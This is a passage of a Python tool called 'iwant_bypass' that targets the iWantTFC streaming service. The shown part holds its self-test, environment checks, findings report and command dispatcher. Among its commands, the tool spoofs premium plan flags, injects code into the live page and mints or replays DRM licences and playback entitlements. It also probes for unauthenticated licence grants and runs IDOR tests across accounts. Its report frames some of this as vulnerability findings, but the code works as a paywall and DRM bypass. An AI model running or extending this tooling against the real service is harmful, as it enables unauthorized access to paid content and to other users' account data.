        log("no active subscription record - anonymous/free only", "w")
        return 0
    for p in plan["plans"]:
        log(f"{p['name'] or p['serviceId']}  service={p['serviceId']}  "
            f"freemium={p['freemium']}  trial={p['trial']}  status={p['status'] or '?'}  "
            f"quality={p['quality'] or '?'}  ads={p['ads']}",
            "w" if p["freemium"] else "g")
    if all(p["freemium"] for p in plan["plans"]):
        log("freemium only - titles outside the free catalogue stay EPS 401", "w")
    return 0


def _status(name, fn):
    try:
        ok, detail = fn()
    except Exception as e:
        ok, detail = False, f"{type(e).__name__}: {e}"
    log(f"{'PASS' if ok else 'FAIL'}  {name}" + (f" - {detail}" if detail else ""),
        "g" if ok else "e")
    return ok


def _synthetic_jwt(claims):
    def enc(d):
        return base64.urlsafe_b64encode(json.dumps(d).encode()).decode().rstrip("=")
    return f"{enc({'alg': 'HS256', 'typ': 'JWT'})}.{enc(claims)}.sig"


def run_unit_suite():
    tf = HERE / "test_iwant_bypass.py"
    if not tf.exists():
        log(f"unit suite missing: {tf}", "w")
        return True, 0
    import importlib.util as ilu
    import unittest
    try:
        spec = ilu.spec_from_file_location("test_iwant_bypass", tf)
        mod = ilu.module_from_spec(spec)
        spec.loader.exec_module(mod)
        suite = unittest.defaultTestLoader.loadTestsFromModule(mod)
        res = unittest.TextTestRunner(verbosity=1).run(suite)
        return res.wasSuccessful(), res.testsRun
    except Exception as e:
        log(f"unit suite could not run: {e}", "e")
        return False, 0


def self_test(live=False, session="", no_unit=False):
    """Offline invariants plus an optional live remint/manifest/licence probe."""
    log("selftest - offline checks", "g")
    ok = []

    def c_norm():
        got = norm_lic("https://widevine-dash.ezdrm.com/proxy?pX=1\\u0026CustomData=a\\/b")
        want = "https://widevine-dash.ezdrm.com/proxy?pX=1&CustomData=a/b"
        return got == want, "" if got == want else got
    ok.append(_status("norm_lic", c_norm))

    exp = int(time.time()) + 120
    cd = _synthetic_jwt({"exp": exp})

    def c_exp():
        got = lic_exp_from_url(f"https://widevine-dash.ezdrm.com/proxy?pX=1&CustomData={cd}")
        return got == float(exp), f"{got} vs {exp}"
    ok.append(_status("lic_exp_from_url", c_exp))

    def c_mpd():
        x = ('<MPD><BaseURL>https://cdn.example/root/</BaseURL>'
             '<Location>https://cdn.example/b?x=1&amp;y=2</Location>'
             '<Period><SegmentTemplate media="s_$Number$.m4s?m=1"/></Period></MPD>')
        out = rewrite_mpd(x, mpd_base(x, "https://cdn.example/live/index.mpd"))
        good = ("/p/abs?u=" in out and "<BaseURL>" not in out
                and "<Location>" not in out and "minimumUpdatePeriod" in out)
        return good, ""
    ok.append(_status("rewrite_mpd", c_mpd))

    def c_order():
        s = Session(asset_id="a")
        s.api_chain = [{"url": "https://www.iwanttfc.com/player/a"},
                       {"url": "https://api.iwanttfc.com/subs"},
                       {"url": "https://api.iwanttfc.com/entitlement/playback/start/a"}]
        st = _replay_order(s)
        return "playback/start" in st[0]["url"], st[0]["url"][:70]
    ok.append(_status("replay order", c_order))

    def c_token():
        if not TOKENF.exists():
            return False, "token.txt missing - run: token"
        try:
            tok = json.loads(TOKENF.read_text(encoding="utf-8")).get("token") or ""
        except (OSError, ValueError):
            return False, "token.txt unreadable"
        left = jwt_exp(tok) - time.time()
        return left > 30, f"{int(left // 60)}m left" if left > 0 else "expired"
    ok.append(_status("bearer", c_token))

    def c_ident():
        if not IDENTF.exists():
            return False, "identity.json missing - run: ident"
        u = json.loads(IDENTF.read_text(encoding="utf-8")).get("userId")
        return bool(u), u or "empty"
    ok.append(_status("identity", c_ident))

    def c_sess():
        p = Path(session) if session else newest_complete()
        if not p or not Path(p).exists():
            return False, "no complete session with mpd + licence"
        s = load_sess(p)
        good = bool(s.api_chain and s.mpd_url and s.license_url)
        return good, f"{Path(p).name} steps={len(s.api_chain)} lic={int(s.lic_left())}s"
    ok.append(_status("session", c_sess))

    if not no_unit:
        good, n = run_unit_suite()
        ok.append(good)
        log(f"{'PASS' if good else 'FAIL'}  unit suite ({n} tests)", "g" if good else "e")

    if live:
        log("selftest - live checks", "g")
        p = Path(session) if session else newest_complete()
        if not p or not Path(p).exists():
            log("live: no complete session", "e")
            ok.append(False)
        else:
            s = load_sess(p)
            tok, texp = resolve_token("", None, "", allow_harvest=False)
            if not tok or texp <= time.time():
                log("live: no usable bearer - run: token", "e")
                ok.append(False)
            else:
                s.bearer = tok
                t0 = time.time()
                minted = remint(s)
                dt = time.time() - t0
                ok.append(_status("remint", lambda: (minted,
                                                     f"{dt:.1f}s lic={int(s.lic_left())}s")))
                if minted:
                    try:
                        mr = http.get(s.mpd_url, headers=clean(s.mpd_headers, DROP_REQ), timeout=20)
                        ok.append(_status("manifest", lambda: (mr.status_code == 200,
                                                               f"{mr.status_code} {len(mr.content)}b")))
                    except http.RequestException as e:
                        ok.append(_status("manifest", lambda: (False, str(e))))
                    try:
                        dummy = base64.b64encode(b"selftest-challenge").decode()
                        if s.license_mode == "json":
                            body = json.dumps({"challenge": dummy,
                                               "CustomData": s.license_custom_data or ""}).encode()
                            ct = "application/json"
                        else:
                            body, ct = b"selftest", (s.license_content_type
                                                     or "application/octet-stream")
                        h = clean(s.license_headers, DROP_REQ)
                        h["content-type"] = ct
                        lr = http.post(norm_lic(s.license_url), headers=h, data=body, timeout=20)
                        note = ("real licence" if lr.status_code == 200 else
                                "placeholder rejected (expected)"
                                if lr.status_code in (400, 401, 403, 500) else "unexpected")
                        ok.append(_status("licence endpoint",
                                          lambda: (True, f"{lr.status_code} - {note}")))
                    except http.RequestException as e:
                        ok.append(_status("licence endpoint", lambda: (False, str(e))))
    passed = sum(1 for x in ok if x)
    log(f"selftest {passed}/{len(ok)} passed", "g" if passed == len(ok) else "e")
    return 0 if passed == len(ok) else 1


# ---------------------------------------------------------------- doctor / report
def doctor():
    print("iwant_bypass - environment\n")
    print(f"python   : {sys.version.split()[0]}")
    print(f"sessions : {SD}")
    print(f"profile  : {PROFILE}  (seeded: {'yes' if READY.exists() else 'NO - run login'})")
    if TOKENF.exists():
        try:
            d = json.loads(TOKENF.read_text(encoding="utf-8"))
            left = jwt_exp(d.get("token") or "") - time.time()
            print(f"token    : cached, {'valid ' + str(int(left // 60)) + 'm' if left > 0 else 'EXPIRED'}")
        except Exception:
            print("token    : unreadable")
    else:
        print("token    : none - run: token")
    if IDENTF.exists():
        try:
            d = json.loads(IDENTF.read_text(encoding="utf-8"))
            print("identity : present (personal data not printed)")
            if not d.get("userId"):
                print("           empty - run: ident --uid <uuid>")
        except Exception:
            print("identity : unreadable")
    else:
        print("identity : none - run: ident")
    print(f"iwua hdr : {BH['x-iw-useragent'][:52]}...")
    print(f"uauth    : {'cached (dead lane, ignored)' if UAF.exists() else 'none'}")
    print("legacy   : /api/1.0/* is gone from the rebuilt site - use capture/mint/gql")
    if DEADF.exists():
        print(f"           api10 marked it dead at {DEADF.read_text(encoding='utf-8').strip()}")
    rr = load_routes()["routes"]
    print(f"routes   : {len(rr)} known" + ("" if rr else " - run: routes <assetId> --context"))
    for p in rr:
        print(f"           {p}")
    starts = start_candidates("00000000-0000-0000-0000-000000000000")
    print("start    : primary candidate")
    for u in starts[:3]:
        print(f"           {u[:130]}")
    print(f"country  : {COUNTRY}   platform: {PLATFORM}   (IWANT_COUNTRY / IWANT_PLATFORM)")
    print(f"grab     : {'present' if GRABF.exists() else 'none - run: grab <assetId>'}")
    print(f"template : {'present' if TPLF.exists() else 'none - run: capture <url> --trace'}")
    chrome = find_chrome()
    print(f"chrome   : {chrome or 'NOT FOUND - set CHROME_PATH'}")
    for m in ("requests", "flask", "playwright"):
        try:
            __import__(m)
            print(f"{m:<9}: ok")
        except ImportError:
            print(f"{m:<9}: MISSING")
    if cdp_alive():
        print(f"cdp      : attached on {CDP_PORT}")
    else:
        print("cdp      : not running - run: chrome")
    if sync_playwright is None or not chrome:
        print("\nincomplete - fix the above before capture")
        return
    for hl, tag in ((False, "headed"), (True, "headless")):
        ok, abck = wv_check(chrome, hl)
        print(f"widevine : {tag:<8} {ok}")
        if hl:
            print(f"_abck    : {tag:<8} {'present' if abck else 'ABSENT - profile is cold, run login'}")
    print("\nheaded ERR:NotSupportedError means the CDM never downloaded -")
    print("kill stray chrome.exe holding the profile, then run: chrome")
    import socket
    sock = socket.socket()
    try:
        sock.bind(("127.0.0.1", PORT))
        print(f"port {PORT} : free")
    except OSError:
        print(f"port {PORT} : IN USE")
    finally:
        sock.close()


def report_merge(sess, out_path):
    pr = probe(sess, "")
    idn = collect_ident(sess.bearer)
    ch_uid = chain(sess, "", idn["userId"], "uid") if idn.get("userId") else None
    ez = ezdrm_probe(sess)
    lc = lic_probe(sess, resolve_uauth("")) if sess.license_url else None
    doc = {"generated": datetime.now().isoformat(timespec="seconds"),
           "asset_id": sess.asset_id, "player_url": sess.player_url,
           "is_live": sess.is_live, "widevine": sess.widevine, "blocked": sess.blocked,
           "license_post_observed": sess.license_post_observed,
           "license_resp_status": sess.license_resp_status,
           "cdata_present": bool(sess.license_custom_data),
           "lane": "eps", "country": COUNTRY, "platform": PLATFORM,
           "kid": sess.kid, "mpds": sess.mpds, "license_auth": sess.license_auth,
           "item_url": sess.item_url, "identity": sess.identity,
           "entitlement_fields": sess.ent,
           "observed": sess.observed,
           "chain_steps": [{"method": x["method"], "url": x["url"],
                            "body": x.get("body")} for x in sess.api_chain],
           "probe": pr, "chain_uid": ch_uid, "ezdrm": ez, "licprobe": lc,
           "findings": [f for f in [
               {"id": "V1", "title": "Unauthenticated DRM grant via entitlement/playback/start",
                "evidence": pr["reason"]} if pr["verdict"] == "BYPASS" else None,
               {"id": "V2", "title": "Unauthenticated license POST observation",
                "evidence": f"status={ez['status']}, cdata={'yes' if ez['custom_data_present'] else 'no'}"}
               if ez["status"] else None,
               {"id": "V3", "title": "License accepts unauthenticated challenge",
                "evidence": f"verdict={lc['verdict']}"}
               if lc and lc.get("verdict") == "GRANT" else None,
           ] if f]}
    Path(out_path).write_text(json.dumps(doc, indent=2), encoding="utf-8")
    log(f"report -> {out_path}", "g")
    return doc


def main():
    argv = sys.argv[:]
    cut = [i for i, x in enumerate(argv) if i and x.lower().endswith(".py")]
    if cut:
        rest = argv[cut[0]:]
        sys.argv = argv[:cut[0]]
        log(f"stray command ignored: {' '.join(rest)} - run it separately", "w")

    ap = argparse.ArgumentParser(
        description="iWantTFC capture/grab/routes/gql/legacy/mint/probe/chain/idor/play")
    sub = ap.add_subparsers(dest="cmd", required=True)

    ch = sub.add_parser("chrome")
    ch.add_argument("--exe", default="")
    ch.add_argument("--url", default="about:blank")

    lg = sub.add_parser("login")
    lg.add_argument("--exe", default="")

    tk = sub.add_parser("token")
    tk.add_argument("--exe", default="")

    idp = sub.add_parser("ident")
    idp.add_argument("--token", default="")
    idp.add_argument("--uid", default="")
    idp.add_argument("--email", default="")
    idp.add_argument("--app", action="store_true")

    gb = sub.add_parser("grab")
    gb.add_argument("asset_id")
    gb.add_argument("--exe", default="")

    rt = sub.add_parser("routes")
    rt.add_argument("asset_id", nargs="?", default="")
    rt.add_argument("--exe", default="")
    rt.add_argument("--context", action="store_true", help="print source around each hit")
    rt.add_argument("--no-ads", action="store_true", help="block ad SDKs while scanning")

    c = sub.add_parser("capture")
    c.add_argument("player_url")
    c.add_argument("--wait", type=int, default=90)
    c.add_argument("--exe", default="")
    c.add_argument("--headless", action="store_true", help="WARNING: no Widevine CDM headless")
    c.add_argument("--live", action="store_true", help="force live cadence (auto-detected anyway)")
    c.add_argument("--spoof", default="", help="'premium' = plan flags; 'full' = also entitlements, EPS-401, storage")
    c.add_argument("--inject", action="store_true", help="live in-page injection, REST and GraphQL")
    c.add_argument("--no-ads", action="store_true", help="block GPT/IMA so no pre-roll runs")
    c.add_argument("--no-warm", action="store_true", help="skip the origin warm-up")
    c.add_argument("--warm-wait", type=int, default=5)
    c.add_argument("--block", action="append", default=[], help="extra URL glob to abort (repeatable)")
    c.add_argument("--keep-open", action="store_true")
    c.add_argument("--trace", action="store_true")
    c.add_argument("--no-mint", action="store_true", help="skip the recovery mint when no chain lands")
    c.add_argument("--no-serve", action="store_true")

    mt = sub.add_parser("mint")
    mt.add_argument("asset_id")
    mt.add_argument("--token", default="")
    mt.add_argument("--session-endpoint", default="")
    mt.add_argument("--start-endpoint", default="")
    mt.add_argument("--body", default="", help="raw JSON body, or @file.json")
    mt.add_argument("--from-grab", action="store_true", help="compose the body from grab.json")
    mt.add_argument("--from-capture", action="store_true", help="use start_template.json from capture")
    mt.add_argument("--uid", default="", help="insert this userId into every body variant")
    mt.add_argument("--order", default="", help="insert this orderId into every body variant")
    mt.add_argument("--live", action="store_true")
    mt.add_argument("--exe", default="")
    mt.add_argument("--no-ads", action="store_true", help="block ad SDKs in the page")
    mt.add_argument("--in-page", action="store_true", help="force in-page mode (default)")
    mt.add_argument("--http", action="store_true", help="plain HTTP only - the decisive replay")
    mt.add_argument("--no-session", action="store_true", help="skip session-step probing")
    mt.add_argument("--no-anon", action="store_true")
    mt.add_argument("--no-serve", action="store_true")

    am = sub.add_parser("api10")
    am.add_argument("asset_id")
    am.add_argument("--uauth", default="")

    gq = sub.add_parser("gql")
    gq.add_argument("asset_id")
    gq.add_argument("--token", default="")

    lg2 = sub.add_parser("legacy")
    lg2.add_argument("asset_id")
    lg2.add_argument("--uauth", default="")
    lg2.add_argument("--auth-mode", default="query", choices=("query", "header", "cookie", "none"))
    lg2.add_argument("--quality", default="")
    lg2.add_argument("--bootstrap", action="store_true")
    lg2.add_argument("--live", action="store_true")
    lg2.add_argument("--exe", default="")
    lg2.add_argument("--no-serve", action="store_true")

    st = sub.add_parser("stream")
    st.add_argument("stream_id")
    st.add_argument("--uauth", default="")
    st.add_argument("--auth-mode", default="query", choices=("query", "header", "cookie", "none"))

    lp = sub.add_parser("licprobe")
    lp.add_argument("session")
    lp.add_argument("--uauth", default="")

    ua = sub.add_parser("uauth")
    ua.add_argument("--exe", default="")

    dv = sub.add_parser("devices")
    dv.add_argument("--uauth", default="")
    dv.add_argument("--delete", default="")

    p = sub.add_parser("probe")
    p.add_argument("session")
    p.add_argument("--token", default="")

    h = sub.add_parser("chain")
    h.add_argument("session")
    h.add_argument("--token", default="")
    h.add_argument("--orderid", default="")
    h.add_argument("--uid", default="")

    i = sub.add_parser("idor")
    i.add_argument("--report", default="idor_report.json")

    r = sub.add_parser("report")
    r.add_argument("session")
    r.add_argument("--out", default="iwant_report.json")

    rp = sub.add_parser("replay")
    rp.add_argument("session")
    rp.add_argument("--port", type=int, default=PORT)
    rp.add_argument("--open", action="store_true")

    pl = sub.add_parser("play")
    pl.add_argument("session", nargs="?", default="")
    pl.add_argument("--port", type=int, default=PORT)
    pl.add_argument("--exe", default="")
    pl.add_argument("--no-open", action="store_true")

    pn = sub.add_parser("plan")
    pn.add_argument("--token", default="")
    pn.add_argument("--uid", default="")

    stf = sub.add_parser("selftest")
    stf.add_argument("--live", action="store_true", help="remint + fetch manifest + probe licence")
    stf.add_argument("--session", default="")
    stf.add_argument("--no-unit", action="store_true", help="skip test_iwant_bypass.py")

    sub.add_parser("doctor")
    a, extra = ap.parse_known_args()
    if extra:
        log(f"ignoring stray args: {extra}", "w")
    SD.mkdir(parents=True, exist_ok=True)

    if a.cmd == "chrome":
        if open_real_chrome(a.exe, a.url):
            log("now run doctor / login / capture - they will attach instead of launching", "g")
        return
    if a.cmd == "doctor":
        doctor()
        return
    if a.cmd == "plan":
        raise SystemExit(do_plan(a.token, a.uid))
    if a.cmd == "selftest":
        raise SystemExit(self_test(a.live, a.session, a.no_unit))
    if a.cmd == "login":
        do_login(a.exe)
        return
    if a.cmd == "token":
        do_token(a.exe)
        return
    if a.cmd == "ident":
        do_ident(a.token, a.uid, a.email, a.app)
        return
    if a.cmd == "grab":
        do_grab(a.asset_id, a.exe)
        return
    if a.cmd == "routes":
        doc = discover_routes(a.asset_id, a.exe, context=a.context, no_ads=a.no_ads)
        if doc:
            s_ = [p for p in doc["routes"] if "start" in p.lower()]
            g_ = [p for p in doc["routes"] if "graphql" in p.lower()]
            l_ = [p for p in doc["routes"] if p.startswith("/api/1.0")]
            log(f"start routes  : {s_ or 'none'}", "g")
            log(f"graphql routes: {g_ or 'none'}", "g")
            log(f"legacy routes : {l_ or 'none - lane is dead'}", "g")
            log("note: start must carry the /entitlement prefix AND the query", "w")
            log("      bare /playback/start/ is edge-blocked without browser cookies", "w")
        return
    if a.cmd == "capture":
        try:
            s = capture(a.player_url, a.wait, a.exe, a.headless, a.live,
                        a.spoof.strip().lower(), a.keep_open, a.trace, not a.no_mint,
                        a.inject, a.no_ads, not a.no_warm, a.warm_wait, a.block)
        except KeyboardInterrupt:
            s = ST.get("last_capture")
            log("interrupted", "w")
            if s is not None:
                s.note = "interrupted capture"
                log(f"saved partial {save_sess(s)}", "w")
                if s.mpd_url and s.license_url:
                    log("partial chain has manifest + licence - run: play", "g")
            raise SystemExit(130)
        s.note = (f"captured; live={s.is_live}; steps={len(s.api_chain)}; "
                  f"observed={len(s.observed)}; blocked={s.blocked or 'none'}")
        log(f"saved {save_sess(s)}", "g")
        log(f"[MPD] {s.mpd_url[:100] or '-'}")
        log(f"[LIC] {s.license_url[:100] or '-'}")
        if not a.no_serve:
            serve(s, True, PORT, a.exe)
    elif a.cmd == "mint":
        s = Session(asset_id=a.asset_id, is_live=a.live,
                    player_url=f"{S}/player/{a.asset_id}")
        log(f"direct mint - asset {a.asset_id}  (country={COUNTRY} platform={PLATFORM})")
        tok, exp = resolve_token(a.token, None, a.exe)
        report_ttl(tok, exp)
        s.bearer = tok
        ident = collect_ident(tok, a.uid)
        if ident.get("userId"):
            log("identity captured", "g")
        s.identity = ident
        bodies = body_variants(a.body, a.from_grab or a.from_capture, a.asset_id)
        log(f"bodies: {[sorted(b) if isinstance(b, dict) else 'str' for b in bodies]}")
        extra = {}
        if a.uid or ident.get("userId"):
            extra["userId"] = a.uid or ident["userId"]
        if a.order:
            extra["orderId"] = a.order
        res = mint(s, a.asset_id, tok, a.session_endpoint, a.start_endpoint,
                   not a.no_anon, not a.http, a.exe, a.no_session, bodies, a.no_ads, extra)
        Path("mint_report.json").write_text(json.dumps(res, indent=2), encoding="utf-8")
        if not res["ok"]:
            log(f"FAILED - {res['reason']}", "e")
            edge = [x for x in res["attempts"] if EDGE_RE.search(x.get("preview") or "")]
            if edge:
                log("EDGE 403 - the URL lost its /entitlement prefix or the query", "e")
            eps = [x for x in res["attempts"] if "not authorized" in (x.get("preview") or "")]
            if eps:
                log("EPS says 'User is not authorized' - the account has no entitlement", "e")
                plan, perr = active_plan(tok, ident.get("userId"))
                for p in plan["plans"]:
                    log(f"plan: {p['name'] or p['serviceId']} freemium={p['freemium']} "
                        f"quality={p['quality'] or '?'} status={p['status'] or '?'}", "w")
                if plan["plans"] and all(p["freemium"] for p in plan["plans"]):
                    log("all active plans are freemium - this title needs a paid plan", "e")
                elif perr:
                    log(f"plan lookup: {perr}", "w")
                ju = ident.get("jwt_uid") or ""
                js = ident.get("jwt_sub") or ""
                if ju and js and ju != js:
                    log("identity candidates differ - body uid vs jwt sub", "w")
                u = ju or ident.get("userId") or "<uuid>"
                log(f"try: mint {a.asset_id} --from-capture --http --uid {u}", "w")
                log("     if the 401 persists, the account lacks this title - use an "
                    "entitled account or a free asset", "w")
                log("     or a different IWANT_COUNTRY", "w")
            log("try: routes <asset> --context   to re-read the current URL shape", "w")
            return
        log(f"MINTED - {res['reason']}", "g")
        s.note = f"mint ok ({res.get('mode', 'http')}); steps={len(s.api_chain)}"
        log(f"saved {save_sess(s)}", "g")
        if not a.no_serve:
            serve(s, True, PORT, a.exe)
    elif a.cmd == "gql":
        tok, _ = resolve_token(a.token, None, "", allow_harvest=True)
        out = gql_probe(a.asset_id, tok)
        Path("gql_report.json").write_text(json.dumps(out, indent=2), encoding="utf-8")
        log(f"{'HIT' if out['ok'] else 'MISS'} - {out['reason']}", "g" if out["ok"] else "w")
        if out["mpd"]:
            log("the manifest is reachable through GraphQL - feed it back with: "
                "mint <asset> --start-endpoint <path>", "w")
    elif a.cmd == "uauth":
        tok = resolve_uauth("")
        if not tok:
            log("no UserAuthentication in the profile - run: login, then retry", "e")
            return
        log(f"cached -> {UAF}  (dead lane - informational only)", "g")
    elif a.cmd == "api10":
        out = api10_matrix(a.asset_id, resolve_uauth(a.uauth))
        Path("api10_report.json").write_text(json.dumps(out, indent=2), encoding="utf-8")
    elif a.cmd == "legacy":
        if a.bootstrap:
            legacy_bootstrap(refresh=True)
        elif DEADF.exists():
            log("api10 already marked /api/1.0/ dead - expect 404s; use capture/mint/gql", "w")
        tok = "" if a.auth_mode == "none" else resolve_uauth(a.uauth)
        if a.auth_mode != "none" and not tok:
            log("no token - running the lane anonymously", "w")
        s = Session(asset_id=a.asset_id, is_live=a.live, player_url=f"{S}/player/{a.asset_id}")
        res = mint_legacy(s, a.asset_id, tok, a.auth_mode, a.quality)
        Path("legacy_report.json").write_text(json.dumps(res, indent=2), encoding="utf-8")
        if not res["ok"]:
            log(f"FAILED - {res['reason']}", "e")
            log("the lane is gone; run: mint <asset> --from-capture --http", "w")
            return
        log(f"OK - {res['reason']}", "g")
        log(f"saved {save_sess(s)}", "g")
        if not a.no_serve:
            serve(s, True, PORT, a.exe)
    elif a.cmd == "stream":
        tok = "" if a.auth_mode == "none" else resolve_uauth(a.uauth)
        out = stream_probe(a.stream_id, tok, a.auth_mode)
        Path("stream_report.json").write_text(json.dumps(out, indent=2), encoding="utf-8")
        log(f"{'GRANT' if out['ok'] else 'NO GRANT'} - {out['reason']}", "g" if out["ok"] else "w")
        if not out["ok"]:
            log("lane is gone - live assets need mint with --live", "w")
    elif a.cmd == "licprobe":
        out = lic_probe(load_sess(a.session), resolve_uauth(a.uauth))
        Path("licprobe_report.json").write_text(json.dumps(out, indent=2), encoding="utf-8")
        log(f"VERDICT {out['verdict']}", "g" if out["verdict"] == "GRANT" else "w")
    elif a.cmd == "devices":
        tok = resolve_uauth(a.uauth)
        out = devices(tok, a.delete)
        log(json.dumps(out.get("json") or out.get("text"))[:1200],
            "g" if out["status"] == 200 else "w")
    elif a.cmd == "probe":
        out = probe(load_sess(a.session), a.token)
        log(f"VERDICT {out['verdict']} - {out['reason']}",
            "g" if out["verdict"] == "BYPASS" else "w")
        Path("probe_report.json").write_text(json.dumps(out, indent=2), encoding="utf-8")
    elif a.cmd == "chain":
        v = a.uid or a.orderid
        f = "uid" if a.uid and not a.orderid else ("orderid" if a.orderid and not a.uid else "both")
        out = chain(load_sess(a.session), a.token, v, f)
        log(f"VERDICT {out['verdict']} - {out['reason']}",
            "g" if out["verdict"].startswith("BYPASS") else "w")
        Path("chain_report.json").write_text(json.dumps(out, indent=2), encoding="utf-8")
    elif a.cmd == "idor":
        cr = prompt_idor()
        if not cr:
            sys.exit(1)
        ta, ua_, tb, ub = cr
        T, ok = run_idor(ta, ua_, tb, ub)
        Path(a.report).write_text(
            json.dumps({"endpoint": SUBS, "reliable": ok, "tests": T}, indent=2), encoding="utf-8")
        log(f"report -> {a.report}", "g")
    elif a.cmd == "report":
        report_merge(load_sess(a.session), a.out)
    elif a.cmd == "replay":
        serve(load_sess(a.session), a.open, a.port)
    elif a.cmd == "play":
        pth = a.session
        if not pth or pth.lower() in ("newest", "latest", "<newest>", "-"):
            cands = sorted(SD.glob("*.json"), key=lambda p: p.stat().st_mtime, reverse=True)
            if not cands:
                log("no saved sessions - mint or capture first", "e")
                return
            full = []
            for c in cands:
                try:
                    d = json.loads(c.read_text(encoding="utf-8"))
                except (OSError, ValueError):
                    continue
                if d.get("mpd_url") and d.get("license_url"):
                    full.append(c)
            pth = str(full[0] if full else cands[0])
            log(f"newest {'complete' if full else 'incomplete'} session: {pth}", "g")
        try:
            s = load_sess(pth)
        except (OSError, ValueError) as e:
            log(f"cannot read session {pth}: {e}", "e")
            return
        if not s.api_chain:
            log("session has no chain - capture with --inject, or mint --from-capture", "e")
        if not s.bearer or jwt_exp(s.bearer) - time.time() < 60:
            tok, exp = resolve_token("", None, a.exe, allow_harvest=False)
            if tok and exp > time.time():
                s.bearer = tok
            report_ttl(s.bearer, jwt_exp(s.bearer))
        if s.license_url and s.lic_exp and s.lic_left() <= 0:
            log("saved licence expired - player will remint on first request", "w")
        if s.is_live:
            log("live session - remint every 20s while playing", "w")
        serve(s, not a.no_open, a.port, a.exe)


if __name__ == "__main__":
    main()